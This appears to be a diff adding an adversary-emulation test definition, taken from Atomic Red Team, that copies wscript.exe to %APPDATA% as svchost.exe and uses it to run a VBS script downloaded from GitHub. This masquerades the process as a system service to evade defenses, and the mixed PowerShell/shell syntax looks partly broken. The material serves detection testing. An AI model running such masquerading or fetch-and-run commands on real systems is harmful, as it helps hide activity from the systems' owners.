@@ -1,0 +1,52 @@
+- id: 24136435-c91a-4ede-9da1-8b284a1c1a23
+  name: Masquerading - wscript.exe running as svchost.exe
+  description: 'Copies wscript.exe, renames it, and launches it to masquerade as an
+    instance of svchost.exe.
+
+
+    Upon execution, no windows will remain open but wscript will have been renamed
+    to svchost and ran out of the temp folder'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1036.003
+    name: 'Masquerading: Rename System Utilities'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs")
+          -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs";
+          fi; copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y; cmd.exe
+          /c %APPDATA%\svchost.exe "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"'
+        cleanup: del /Q /F %APPDATA%\svchost.exe >nul 2>&1
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - defense-evasion
+  - atomic-red-team
+  - t1036.003
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'Wscript file to execute must exist on disk
+
+        '
+      prereq_command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs")
+        {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"
+
+        '
+    technique_created: '2020-02-10T20:03:11.691Z'
+    atomic_guid: 24136435-c91a-4ede-9da1-8b284a1c1a23
+    import_timestamp: '2025-06-24T11:15:01.234320Z'
